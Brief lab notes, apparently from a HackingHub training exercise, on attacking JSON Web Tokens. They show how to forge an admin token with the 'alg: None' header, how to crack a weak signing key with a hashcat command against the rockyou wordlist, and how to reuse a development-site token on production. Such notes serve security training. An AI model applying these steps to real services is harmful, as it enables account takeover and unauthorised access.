# JWT (HackingHub)

https://jwt.io/

## Bypassing signature checks

*Captura omitida por posibles datos sensibles.*
```json
{"typ":"JWT","alg":"None"}
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJOb25lIn0=

```json
{"username":"admin"}
```
eyJ1c2VybmFtZSI6ImFkbWluIn0=

the same
ODnAXt9IXHDcP17XNR1yqHedzpifSsIejjDujNyiyRI

*Captura omitida por posibles datos sensibles.*

## Crackable key

```jwt
<REDACTED_JWT>
```

```bash
hashcat -m 16500 -a 0 jwt.txt /usr/share/seclists/rockyou.txt
```

*Captura omitida por posibles datos sensibles.*
## Reuse of JWT

![Pasted image 20241216134846.png](../../assets/images/f5c572860cdaa21887b1.png)

### Development website

Register on development, 

```jwt
<REDACTED_JWT>
```

### Production website

Use the same JWT of development website, 

![Pasted image 20241216134956.png](../../assets/images/a874dc2d2aa94ee6e48d.png)
